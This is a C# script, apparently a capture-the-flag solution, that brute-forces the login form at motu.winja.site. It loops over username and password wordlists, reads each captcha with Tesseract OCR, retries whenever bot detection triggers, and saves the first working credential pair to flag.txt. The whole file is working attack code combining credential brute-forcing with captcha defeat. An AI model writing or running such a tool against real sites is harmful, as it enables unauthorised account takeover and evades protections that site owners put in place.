using System.Drawing;
using System.Net;
using System.Text;
using Tesseract;
using Leaf.xNet;

var users = File.ReadAllLines("usernames.txt");
var passwords = File.ReadAllLines("passwords.txt");

for (int i = 0; i < users.Length; i++)
{
    for(int j = 0; j < passwords.Length; j++)
    {

        using (var request = new HttpRequest())
        {
            retry:
            try { 
            var cc = new CookieStorage();
            request.Cookies = cc;
            request.Get("https://motu.winja.site").ToString();
            request.Cookies = cc;
            var img = request.Get("https://motu.winja.site/captcha").ToBytes();
            var cap = ReadOCR(img).Replace("\n", "");
            var u = users[i];
            var p = passwords[j];
            request.Cookies = cc;
            var res = request.Post("https://motu.winja.site/submit", $"userName={u}&password={p}&captcha={cap}", "application/x-www-form-urlencoded").ToString();
            if(res.Contains("Username and password combination doesn"))
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"[*] {u}:{p}");
            }
            else if(res.Contains("not a robot"))
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine($"[^] Detected...");
                goto retry;
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"[-] {u}:{p}");
                File.WriteAllText("flag.txt", $"[-] {u}:{p}");
                    Console.Beep();
                    Console.Beep();
                    Console.Beep();
                    Console.Beep();
                    Console.Beep();
                    Console.Beep();
                    Console.Beep();
                    Console.Beep();
                    Console.Beep();
                    Console.Beep();
                    Console.Beep();
                    Console.Beep();
                    Console.Beep();
                    Console.Beep();
                goto Enddd;
                
            }
            }
            catch
            {
                goto retry;
            }

        }
    }
}

Enddd:



string ReadOCR(byte[] path)
{
    var ocr = new TesseractEngine(@"C:\Program Files (x86)\Tesseract-OCR\tessdata", "eng", EngineMode.Default);
    var page = ocr.Process(Pix.LoadFromMemory(path));
    var text = page.GetText();
    return text;
}
Console.ReadLine();